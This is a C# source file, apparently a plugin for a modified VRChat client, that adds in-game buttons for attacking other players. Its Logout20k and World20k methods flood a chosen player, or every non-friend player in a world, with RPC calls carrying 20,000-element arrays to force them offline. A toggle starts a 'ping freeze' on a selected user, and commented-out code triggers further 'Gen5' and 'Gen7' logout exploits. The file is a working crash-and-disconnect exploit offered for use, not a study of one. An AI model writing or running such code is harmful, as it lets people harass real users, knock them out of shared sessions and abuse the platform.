using Exploits;
using NekoClient;
using NekoClient.Exploits;
using NekoClient.Logging;
using NekoClient.UI;
using NekoClient.Wrappers.Reflection;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using VRC;
using VRC.Core;
using VRCSDK2;

namespace PointToLog
{
    public class PointToLog : PluginBase
    {
        public static void Logout20k(VRC.Player player)
        {
            VRCUiManagerWrappers.Instance.QueueHudMessage($"Logging out user {player.ApiUser().displayName}");
            VRCUiManagerWrappers.Instance.QueueHudMessage("");

            var die = new object[20000];

            if (player != null)
            {
                for (int i = 0; i < 50; i++)
                {
                    Networking.RPC(VRC_EventHandler.VrcTargetType.Others, player.gameObject, "myRPC", die);
                }
            }
        }

        public static void World20k()
        {
            VRCUiManagerWrappers.Instance.QueueHudMessage($"Logging out world");
            VRCUiManagerWrappers.Instance.QueueHudMessage("");

            List<VRC.Player> players = PlayerManager.GetAllPlayers().ToList();
            players.Remove(PlayerManager.GetCurrentPlayer());
            players.RemoveAll(x => x.IsFriend());

            object[] die = new object[20000];

            for (int i = 0; i < 15; i++)
            {
                Networking.RPC(VRC_EventHandler.VrcTargetType.All, players.First().gameObject, "myRPC", die);
            }
        }

        private enum Gestures
        {
            None,
            Fist,
            LetGo = 101,
            Point,
            Peace,
            RockNRoll,
            Gun,
            ThumbsUp,
            MovementClear = 255
        }

        /*private GameObject m_uiGen5;
        private GameObject m_uiGen7;*/

        private GameObject m_uiQuestionMark;
        private LoglessGen2 m_qq;
        private bool m_active = false;

        //private Dictionary<PhotonPlayer, PingFreezer> m_freezes = new Dictionary<PhotonPlayer, PingFreezer>();

        private IEnumerator DelayedStart()
        {
            yield return new WaitForSeconds(10);

            /*m_uiGen5 = VrcOverrideUI.InstantiateUIButton(VrcOverrideUI.GetPlayerDetailsBase(), VrcOverrideUI.GetPlayerDetailsBase().transform.parent.gameObject, "GEN5", () =>
            {
                APIUser targetUser = QuickMenuWrappers.SelectedUser;
                VRC.Player targetPlayer = PlayerManager.GetPlayer(targetUser.id);
                var photonPlayer = PlayerWrappers.PhotonPlayer(targetPlayer);

                Log.Info($"Logging out user {targetUser.displayName}");

                Gen5 gen5 = new Gen5(photonPlayer);
                gen5.Trigger();
            }, new[] { Vector2.down, Vector2.left, Vector2.left, Vector2.left, Vector2.left });

            m_uiGen7 = VrcOverrideUI.InstantiateUIButton(VrcOverrideUI.GetPlayerDetailsBase(), VrcOverrideUI.GetPlayerDetailsBase().transform.parent.gameObject, "GEN7", () =>
            {
                APIUser targetUser = QuickMenuWrappers.SelectedUser;
                VRC.Player targetPlayer = PlayerManager.GetPlayer(targetUser.id);
                var photonPlayer = PlayerWrappers.PhotonPlayer(targetPlayer);

                Log.Info($"Logging out user {targetUser.displayName}");

                Gen7 gen7 = new Gen7(photonPlayer);
                gen7.Trigger();
            }, new[] { Vector2.down, Vector2.left, Vector2.left, Vector2.left }); */

            m_uiQuestionMark = VrcOverrideUI.InstantiateUIButton(VrcOverrideUI.GetPlayerDetailsBase(), VrcOverrideUI.GetPlayerDetailsBase().transform.parent.gameObject, "?: <color=red>OFF</color>", () =>
            {
                APIUser targetUser = QuickMenuWrappers.SelectedUser;
                VRC.Player targetPlayer = PlayerManager.GetPlayer(targetUser.id);
                var photonPlayer = PlayerWrappers.PhotonPlayer(targetPlayer);

                Log.Info($"Beginning ping freeze on {targetUser.displayName}");

                m_active = !m_active;

                if (m_active)
                {
                    m_qq = new LoglessGen2(photonPlayer);
                    m_qq.Trigger();
                    VrcOverrideUI.ChangeUIButtonText(m_uiQuestionMark, "?: <color=green>ON</color>");
                }
                else
                {
                    m_qq.Stop();
                    VrcOverrideUI.ChangeUIButtonText(m_uiQuestionMark, "?: <color=green>OFF</color>");
                }
            }, new[] { Vector2.down, Vector2.left, Vector2.left, Vector2.left });
        }

        public PointToLog()
        {
            Unload += PointToLog_Unload;

            QueueCoroutine(DelayedStart());
        }

        private void PointToLog_Unload()
        {
            /*UnityEngine.Object.DestroyImmediate(m_uiGen5);
            UnityEngine.Object.DestroyImmediate(m_uiGen7);*/
            UnityEngine.Object.DestroyImmediate(m_uiQuestionMark);
        }
    }
}